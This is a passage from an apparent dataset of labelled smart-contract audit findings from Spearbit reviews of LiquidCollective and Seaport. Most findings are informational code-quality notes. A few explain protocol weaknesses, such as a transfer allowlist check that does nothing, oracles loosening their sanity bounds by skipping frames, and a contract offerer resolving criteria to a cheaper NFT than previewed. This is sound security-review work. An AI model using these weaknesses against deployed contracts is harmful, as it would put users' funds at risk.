contributed in the same way to operators that could have not contributed at all to the epoch. This is true for both scenarios where validators that have joined or exited the beacon chain not at the start of the epoch where the last quorum was set.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Document the decision to include executionLayerFees in the logic to trigger _onEarnings to dis- tribute rewards to Operators and Treasury", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The setBeaconData function from OracleManager contract is called when oracle members have reached a quorum. The function after checking that the report data respects some integrity check performs a check to distribute rewards to operators and treasury if needed: uint256 executionLayerFees = _pullELFees(); if (previousValidatorBalanceSum < _validatorBalanceSum + executionLayerFees) { _onEarnings((_validatorBalanceSum + executionLayerFees) - previousValidatorBalanceSum); } The delta between _validatorBalanceSum and previousValidatorBalanceSum is the sum of all the rewards, penalties and slashes that validators have accumulated during the validation work of one or multiple frames. By adding executionLayerFees to the check, it means that even if the validators have performed poorly (the sum of rewards is less than the sum of penalties+slash) they could still get rewards if executionLayerFees is greater than the negative delta of newSum-prevSum. If we look at the natspec of the _onEarnings it seems that only the validator's balance (without fees) should be used in the if check. 47 /// @notice Handler called if the delta between the last and new validator balance sum is positive /// @dev Must be overriden /// @param _profits The positive increase in the validator balance sum (staking rewards) function _onEarnings(uint256 _profits) internal virtual;", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Consider documenting how and if funds from the execution layer fee recipient are considered inside the annualAprUpperBound and relativeLowerBound boundaries.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "When oracle members reach a quorum, the _pushToRiver function is called. Alluvial is performing some sanity check to prevent malicious oracle member to report malicious beacon data. Inside the function, uint256 prevTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); riverAddress.setBeaconData(_validatorCount, _balanceSum, bytes32(_epochId)); uint256 postTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beaconSpec.slotsPerEpoch * _beaconSpec.secondsPerSlot; ,! _sanityChecks(postTotalEth, prevTotalEth, timeElapsed); function _sanityChecks(uint256 _postTotalEth, uint256 _prevTotalEth, uint256 _timeElapsed) internal ,! view { if (_postTotalEth >= _prevTotalEth) { uint256 annualAprUpperBound = BeaconReportBounds.get().annualAprUpperBound; if ( uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) > annualAprUpperBound * _prevTotalEth * _timeElapsed ) { revert BeaconBalanceIncreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, ,! annualAprUpperBound); } } else { uint256 relativeLowerBound = BeaconReportBounds.get().relativeLowerBound; if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) { revert BeaconBalanceDecreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, relativeLowerBound); } ,! } } Both prevTotalEth and postTotalEth call SharesManager.totalUnderlyingSupply() that returns the value from Inside those balance is also included the amount of fees that are pulled from the River._assetBalance(). ELFeeRecipient (Execution Layer Fee Recipient). Alluvial should document how and if funds from the execution layer fee recipient are also considered inside the annualAprUpperBound and relativeLowerBound boundaries. 48", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Allowlist.allow allows arbitrary values for _statuses input", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of allow does not check if the value inside each _statuses item is a valid value or not. The function can be called by both the administrator or the allower (roles authorized to manage the user permissions) that can specify arbitrary values to be assigned to the corresponding _accounts item. The user's permissions handled by Allowlist are then used by the River contract in different parts of the code. Those permissions inside the River contracts are a limited set of permissions that could not match what the allower /admin of the Allowlist has used to update a user's permission when the allow function was called.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Consider exploring a way to update the withdrawal credentials and document all the possible scenarios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The withdrawal credentials is currently set when River.initRiverV1 is called. The func- tion will internally call ConsensusLayerDepositManager.initConsensusLayerDepositManagerV1 that will perform WithdrawalCredentials.set(_withdrawalCredentials); After initializing the withdrawal credentials, there's no way to update it and change it. The withdrawal cre- dentials is a key part of the whole protocol and everything that concern it should be well documented including all the worst-case scenario  What if the withdrawal credentials is lost?  What if the withdrawal credentials is compromised?  What if the withdrawal credentials must be changed (lost, compromised or simply the wrong one has been submitted)? What should be implemented inside the Alluvial logic to use the new withdrawal creden- tials for the operator's validators that have not been funded yet (the old withdrawal credentials has not been sent to the Deposit contract)? Note that currently there's seem to be no way to update the withdrawal credentials for a validator already submitted to the Deposit contract.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Oracle contract allows members to skip frames and report them (even if they are past) one by one or all at once", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of reportBeacon allows oracle members to skip frames (255 epochs) and report them (even if they are past) one by one or all at once. Let's assume that members arrived to a quorum for epochId_X. When quorum is reached, _pushToRiver is called, and it will update the following properties:  clean all the storage used for member reporting.  set ExpectedEpochId to epochId_X + 255.  set LastEpochId to epochId_X. With this context, let's assume that members decide to wait 30 frames (30 days) or that for 30 days they cannot arrive at quorum. At the new time, the new epoch would be epochId_X + 255 * 30 The following scenarios can happen:  1) Report at once all the missed epochs Instead of reporting only the current epoch (epochId_X + 255 * 30), they will report all the previous \"skipped\" epochs that are in the past. In this scenario, ExpectedEpochId contains the number of the expected next epoch assigned 30 days ago from the previous call to _pushToRiver. In reportBeacon if the _epochId is what the system expect (equal to Expect- edEpochId) the report can go on. So to be able to report all the missing reports of the \"skipped\" frames the member just need to call in a se- quence reportBeacon(epochId_X + 255, ...), reportBeacon(epochId_X + 255 + 255, ...) + .... + report- Beacon(epochId_X + 255 * 30, ...)  2) Report only the last epoch In this scenario, they would call directly reportBeacon(epochId_X + 255 * 30, ...). _pushToRiver call _sani- tyChecks to perform some checks as do not allow changes in the amount of staked ether that are below or above some bounds. The call that would be made is _sanityChecks(oracleReportedStakedBalance, prevTotalEth, timeElapsed) where timeElapsed is calculated as uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beacon- Spec.slotsPerEpoch * _beaconSpec.secondsPerSlot; So, time elapsed is the number of seconds between the reported epoch and the LastEpochId. But in this scenario, LastEpochId has the old value from the previous call to _pushToRiver made 30 days ago that will be epochId_X. Because of this, the check made inside _sanityChecks for the upper bound would be more relaxed, allowing a wider spread between oracleReportedStakedBalance and prevTotalEth", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Consider renaming OperatorResolution.active to a more meaningful name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The name active in the struct OperatorResolution could be misleading because it can be confused with the fact that an operator (the struct containing the real operator information is Operator ) is active or not. The value of OperatorResolution.active does not represent if an operator is active, but is used to know if the index associated to the struct's item (OperatorResolution.index) is used or not.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "lsETH and WlsETH's name() functions return inconsistent name.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "lsETH.name() is River Ether, while WlsETH.name() is Wrapped Alluvial Ether.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Rename modifiers to have consistent naming and patterns only<ROLE>.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The modifiers ifGovernor and ifGovernorOrExecutor in Firewall.sol have a different naming conventions and also logical patterns.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "OperatorResolution.active might be a redundant struct field which can be removed.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The value of active stays true once it has been set true for a given index. This is especially true since the only call to Operators.set is from OperatorsRegistryV1.addOperator which does not override values for already registered names.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "The expression for selectedOperatorAvailableKeys in OperatorsRegistry can be simplified.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "tors[selectedOperatorIndex].keys. Since the places that the limit has been set with a value other than 0 has checks against going above keys bound: operators[selectedOperatorIndex].limit is always less than or equal OperatorsRegistry.1.sol#L250-L252 if (_newLimits[idx] > operator.keys) { revert OperatorLimitTooHigh(_newLimits[idx], operator.keys); } OperatorsRegistry.1.sol#L324-L326 if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } OperatorsRegistry.1.sol#L344-L346 52 if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; }", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "The unused constant DELTA_BASE can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The constant DELTA_BASE in BeaconReportBounds is never used.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Remove unused modifiers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The modifier active(uint256 _index) is not used in the project.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Modifier names do not follow the same naming patterns", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The modifier names do not follow the same naming patterns in OperatorsRegistry.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent that values it holds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent the values it holds. _statuses is a bitmap where each bit represents a particular action that a user can take.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "riverAddress can be renamed to river and we can avoid extra interface casting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "riverAddress's name suggest that it is only an address. Although it is an address with the IRiverV1 attached to it. Also, we can avoid unnecessary casting of interfaces.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Define named constants for numeric literals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In _sanitychecks there 2 numeric literals 10000 and 365 days used: uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) ... if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) {", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Move memberIndex and ReportsPositions checks at the beginning of the OracleV1.reportBeacon function.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The checks for memberIndex == -1 and ReportsPositions.get(uint256(memberIndex)) happen in the middle of reportBeacon after quite a few calculations are done.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Document what incentivizes the operators to run their validators when globalFee is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "If GlobalFee could be 0, then neither the treasury nor the operators earn rewards. What factor would motivate the operators to keep their validators running?", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Document how Alluvial plans to prevent institutional investors and operators get into business directly and bypass using the River protocol.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Since the list of operators and also depositors can be looked up from the information on-chain, what would prevent Institutional investors (users) and the operators to do business outside of River? Is there going to be an off-chain legal contract between Alluvial and these other entities to prevent this scenario?", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Document how operator rewards will be distributed if OperatorRewardsShare is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "If OperatorRewardsShare could be 0, then the operators won't earn rewards. What factor would motivate the operators to keep their validators running? Sidenote: Other incentives for the operators to keep their validators running (if their reward share portion is 0) would be some sort of MEV or block proposal/attestation bribes. Related: Avoid to waste gas distributing rewards when the number of shares to be distributed is zero", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Current operator reward distribution does not favor more performant operators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Reward shares are distributed based on the fraction of the active funded non-stopped validators owned by an operator. This distribution of shares does not promote the honest operation of validators to the fullest extent. Since the oracle members don't report the delta in the balance of each validator, it is not possible to reward operators/validators that have been performing better than the rest. Also if a high-performing operator or operators were the main source of the beacon balance sum and if they had enough ETH to initially deposit into the ETH2.0 deposit contract on their own, they could have made more profit that way versus joining as an operator in the River protocol.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "TRANSFER_MASK == 0 which causes a no-op.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "TRANSFER_MASK is a named constant defined as 0 (River.1.sol#L37). Like the other masks DEPOSIT_- MASK and DENY_MASK which supposed to represent a bitmask, on the first look, you would think TRANSFER_MASK would need to also represent a bitmask. But if you take a look at _onTransfer: function _onTransfer(address _from, address _to) internal view override { IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_from, TRANSFER_MASK); // this call reverts if unauthorized or denied IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_to, TRANSFER_MASK); // this call reverts if unauthorized or denied ,! ,! } This would translate into calling onlyAllowed with the: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(x, 0); Now if we look at the onlyAllowed function with these parameters: function onlyAllowed(x, 0) external view { uint256 userPermissions = Allowlist.get(x); if (userPermissions & DENY_MASK == DENY_MASK) { revert Denied(_account); } if (userPermissions & 0 != 0) { // <--- ( x & 0 != 0 ) == false revert Unauthorized(_account); } } Thus if the _from, _to addresses don't have their DENY_MASK set to 1 they would not trigger a revert since we would never step into the 2nd if block above when TRANSFER_MASK is passed to these functions. The TRANSFER_MASK is also used in _onDeposit: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_depositor, DEPOSIT_MASK + TRANSFER_MASK); // DEPOSIT_MASK + TRANSFER_MASK == DEPOSIT_MASK ,! IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_recipient, TRANSFER_MASK); // like above in ,! `_onTransfer`", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Reformat numeric literals with many digits for better readability.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Reformat numeric literals with many digits into a more readable form.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Firewall should follow the two-step approach present in River when transferring govern address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Both River and OperatorsRegistry follow a two-step approach to transfer the ownership of the contract. 1) Propose a new owner storing the address in a pendingAdmin variable 2) The pending admins accept the new role by actively calling acceptOwnership This approach makes this crucial action much safer because 1) Prevent the admin to transfer ownership to address(0) given that address(0) cannot call acceptOwnership 2) Prevent the admin to transfer ownership to an address that cannot \"admin\" the contract if they cannot call acceptOwnership. For example, a contract do not have the implementation to at least call acceptOwnership. 3) Allow the current admin to stop the process by calling transferOwnership(address(0)) if the pending admin has not called acceptOwnership yet The current implementation does not follow this safe approach, allowing the governor to directly transfer the gov- ernor role to a new address.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "OperatorRegistry.removeValidators is resetting the limit (approved validators) even when not needed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of removeValidators allow an admin or node operator to remove val- idators, passing to the function the list of validator's index to be removed. Note that the list of indexes must be ordered DESC. At the end of the function, we can see these checks if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; } That reset the operator's limit to the lower index value (this to prevent that a not approved key get swapped to a position inside the limit). The issue with this implementation is that it is not considering the case where all the operator's validators are already approved by Alluvial. In this case, if an operator removes the validator with the lower index, all the other validators get de-approved because the limit will be set to the lower limit. Consider this scenario: 59 op.limit = 10 op.keys = 10 op.funded = 0 This mean that all the validators added by the operator have been approved by Alluvial and are safe (keys == limit). If the operator or Alluvial call removeValidators([validatorIndex], [0]) removing the validator at index 0 this will  swap the validator_10 with validator_0.  set the limit to 0 because 0 < 10 (_indexes[_indexes.length - 1] < operator.limit). The consequence is that even if all the validators present before calling removeValidators were \"safe\" (because approved by Alluvial) the limit is now 0 meaning that all the validators are not \"safe\" anymore and cannot be selected by pickNextValidators.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Consider renaming transferOwnership to better reflect the function's logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of transferOwnership is not really transferring the ownership from the current admin to the new one. The function is setting the value of the Pending Admin that must subsequently call acceptOwnership to accept the role and confirm the transfer of the ownership.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Wrong return name used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The min function returns the minimum of the 2 inputs, but the return name used is max.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Discrepancy between architecture and code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The architecture diagram states that admin triggers deposits on the Consensus Layer Deposit Man- ager, but the depositToConsensusLayer() function allows anyone to trigger such deposits.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Consider replacing the remaining require with custom errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In the vast majority of the project contracts have defined and already use Custom Errors that provide a better UX, DX and gas saving compared to require statements. There are still some instances of require usage in ConsensusLayerDepositManager and BytesLib contracts that could be replaced with custom errors.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Both wlsETH and lsETH transferFrom implementation allow the owner of the token to use trans- ferFrom like if it was a \"normal\" transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of transferFrom allow the msg.sender to use the function like if it was a \"normal\" transfer. In this case, the allowance is checked only if the msg.sender is not equal to _from if (_from != msg.sender) { uint256 currentAllowance = ApprovalsPerOwner.get(_from, msg.sender); if (currentAllowance < _value) { revert AllowanceTooLow(_from, msg.sender, currentAllowance, _value); } ApprovalsPerOwner.set(_from, msg.sender, currentAllowance - _value); } This implementation diverge from what is usually implemented in both Solmate and OpenZeppelin.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Both wlsETH and lsETH tokens are reducing the allowance when the allowed amount is type(uint256).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The current implementation of the function transferFrom in both SharesManager.1.sol and WLSETH.1.sol is not taking into consideration the scenario where a user has approved a spender the maximum possible allowance type(uint256).max. The Alluvial transferFrom acts differently from standard ERC20 implementations like the one from Solmate and OpenZeppelin. In their implementation, they check and reduce the spender allowance if and only if the allowance is different from type(uint256).max.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Missing, confusing or wrong natspec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "In the current implementation not all the constructors, functions, events, custom errors, variables or struct are covered by natspec comments. Some of them are only partially covered (missing @param, @return and so on). Note that the contracts listed in the context section of the issue have inside of them complete or partial missing natspec.  Natspec Fixes / Typos: River.1.sol#L38-L39 Swap the empty line with the NatSpec @notice - /// @notice Prevents unauthorized calls - + + /// @notice Prevents unauthorized calls OperatorsRegistry.1.sol#L44, OperatorsRegistry.1.sol#L61, OperatorsRegistry.1.sol#L114 Replace name with index. - /// @param _index The name identifying the operator + /// @param _index The index identifying the operator OperatorsRegistry.1.sol#L218 Replace cound with count. - /// @notice Changes the operator stopped validator cound + /// @notice Changes the operator stopped validator count  Expand the natspec explanation: We also suggest expanding some function's logic inside the natspec OperatorsRegistry.1.sol#L355-L358 Expand the natspec documentation and add a @return natspec comment clarifying that the returned value is the number of total operator and not the active/fundable one. ReportsVariants.sol#L5 Add a comment that explains the COUNT_OUTMASK's assignment. This will mask beaconValidators and beacon- Balance in the designed packing. xx...xx <beaconBalance> <beaconValidators> xxxx & COUNT_OUTMASK == 00...00 <beaconBalance> <beaconValidators> 0000 ReportsVariants.sol ReportsVariants should have a documentation regarding the packing used for ReportsVariants in an uint256: [ 0, 16) : <voteCount> oracle member's total vote count for the numbers below (uint16, 2 bytes) ,! [16, [48, 112) : <beaconBalance> 48) : <beaconValidators> total number of beacon validators (uint32, 4 bytes) total balance of all the beacon validators (uint64, 6 bytes) OracleMembers.sol Leave a comment/warning that only there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. ReportsPositions.sol 63 Leave a comment/warning for the ReportsPosition setup that the ith bit in the uint256 represents whether or not there has been a beacon report by the ith oracle member. Oracle.1.sol#L202-L205 Leave a comment/warning that only there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. Allowlist.1.sol#L46-L49 Leave a comment, warning that the permission bitmaps will be overwritten instead of them getting updated. OracleManager.1.sol#L44 Add more comment for _roundId to mention that when the setBeaconData is called by Oracle.1.sol:_push- ToRiver and that the value passed to it for this parameter is always the 1st epoch of a frame. OperatorsRegistry.1.sol#L304-L310 _indexes parameter, mentioning that this array: 1) needs to be duplicate-free and sorted (DESC) 2) each element in the array needs to be in a specific range, namely operator.[funded, keys). OperatorsRegistry.1.sol#L60-L62 Better rephrase the natspec comment to avoid further confusion. Oracle.1.sol#L284-L289 Update the reportBeacon natspec documentation about the _beaconValidators parameter to avoid further con- fusion. Client answer to the PR comment The docs should be updated to also reflect our plans for the Shanghai fork. Basically we can't just have the same behavior for a negative delta in validator count than with a positive delta (where we just assume that each validator that was in the queue only had 32 eth). Now when we exit validator we need to know how much was exited in order to compute the proper revenue value for the treasury and operator fee. This probably means that there will be an extra arg with the oracle to keep track of the exited eth value. But as long as the spec is not final, we'll stick to the validator count always growing. We should definitely add a custom error to explain that in case a report provides a smaller validator count.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Remove unused imports from code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "The codebase has unused imports across the code base. If they are not used inside the contract, it would be better to remove them to avoid confusion.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "Missing event emission in critical functions, init functions and setters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf", "body": "Some critical functions like contract's constructor, contract's init*(...)function (upgradable con- tracts) and some setter or in general critical functions are missing event emission. Event emissions are very useful for external web3 applications, but also for monitoring the usage and security of your protocol when paired with external monitoring tools. Note: in the init*(...)/constructor function, consider if adding a general broad event like ContractInitial- ized or split it in more specific events like QuorumUpdated+OwnerChanged+... 65 Note: in general, consider adding an event emission to all the init*(...) functions used to initialize the upgrad- able contracts, passing to the event the relevant args in addition to the version of the upgrade.", "labels": ["Spearbit", "LiquidCollective", "Severity: Informational"]}, {"title": "The spent offer amounts provided to OrderFulfilled for collection of (advanced) orders is not the actual amount spent in general", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, the OrderFulfilled is called before applying fulfillments and executing transfers. The offer and consideration items have the following forms: C = (It , T , i, acurr , R, acurr ) O = (It , T , i, acurr , acurr ) Where parameter description It T i acurr R O C itemType token identifier the interpolation of startAmount and endAmount depending on the time and the fraction of the order. consideration item's recipient offer item. consideration item. The SpentItems and ReceivedItem items provided to OrderFulfilled event ignore the last component of the offer/consideration items in the above form since they are redundant. Seaport enforces that all consideration items are used. But for the endpoints in this context, we might end up with offer items with only a portion of their amounts being spent. So in the end O.acurr might not be the amount spent for this offer item, but OrderFulfilled emits O.acurr as the amount spent. This can cause discrepancies in off-chain bookkeeping by agents listening for this event. The fulfillOrder and fulfillAdvancedOrder do not have this issue, since all items are enforced to be used. These two endpoints also differ from when there are collections of (advanced) orders, in that they would emit the OrderFulfilled at the of their call before clearing the reentrancy guard.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, there are scenarios where not all offer items will be used. When not all the current amount of an offer item is used and if this offer item belongs to an order which is of either CONTRACT order type or it is restricted order (and the caller is not the zone), then the spent amount shared with either the contract offerer or zone through their respective endpoints (validateOrder for zones and ratifyOrder for contract offerers) does not reflect the actual amount spent. When Seaport is called through one of its more complex endpoints to match or fulfill orders, the offer items go through a few phases: parameter description It T i as ae acurr O itemType token identifier startAmount endAmount the interpolation of startAmount and endAmount depending on the time and the fraction of the order. offer item.  Let's assume an offer item is originally O = (It , T , i, as, ae)  In _validateOrdersAndPrepareToFulfill, O gets transformed into (It , T , i, acurr , acurr )  Then depending on whether the order is part of a match (1, 2. 3) or fulfillment (1, 2) order and there is a corresponding fulfillment data pointing at this offer item, it might transform into (It , T , i, b, acurr ) where b 2 [0, 1). For fulfilling a collection of orders b 2 {0, acurr } depending on whether the offer item gets used or not, but for match orders, it can be in the more general range of b 2 [0, 1).  And finally for restricted or CONTRACT order types before calling _assertRestrictedAdvancedOrderValidity, the offer item would be transformed into (It , T , i, acurr , acurr ). So the startAmount of an offer item goes through the following flow: as ! acurr ! b 2 [0, 1) ! acurr 7 And at the end acurr is the amount used when Seaport calls into the validateOrder of a zone or ratifyOrder of a contract offerer. acurr does not reflect the actual amount that this offer item has contributed to a combined amount used for an execution transfer.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Empty criteriaResolvers for criteria-based contract orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "There is a deviation in how criteria-based items are resolved for contract orders. For contract orders which have offers with criteria, the _compareItems function checks that the contract offerer returned a corresponding non-criteria based itemType when identifierOrCriteria for the original item is 0, i.e., offering from an entire collection. Afterwards, the orderParameters.offer array is replaced by the offer array returned by the contract offerer. For other criteria-based orders such as offers with identifierOrCriteria = 0, the itemType of the order is only updated during the criteria resolution step. This means that for such offers there should be a corresponding CriteriaResolver struct. See the following test: 8 modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Replacing by `const criteriaResolvers = []` will revert const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, []), ]; const { order, orderHash, value } = await createOrder( However, in case of contract offers with identifierOrCriteria = 0, Seaport 1.2 does not expect a corresponding CriteriaResolver struct and will revert if one is provided as the itemType was updated to be the corresponding non-criteria based itemType. See advanced.spec.ts#L510 for a test case. Note: this also means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled. A malicious contract may use this to their advantage. For example, assume that a contract offerer in Seaport only accepts criteria-based offers. The fulfiller may first call previewOrder where the criteria is always resolved to a rare NFT, but the actual execution would return an uninteresting NFT. If such offers also required a corresponding resolver (similar behaviour as regular criteria based orders), then this could be fixed by explicitly providing the identifier--akin to a slippage check. In short, for regular criteria-based orders with identifierOrCriteria = 0 the fulfiller can pick which identifier to receive by providing a CriteriaResolver (as long as it's valid). For contract orders, fulfillers don't have this option and contracts may be able to abuse this.", "labels": ["Spearbit", "Seaport", "Severity: Medium Risk"]}, {"title": "Advance orders of CONTRACT order types can generate orders with less consideration items that would break the aggregation routine", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf", "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide fewer consideration items for this order. So the total number of consideration items might be less than the ones provided by the caller. But since the caller would need to provide the fulfillment data beforehand 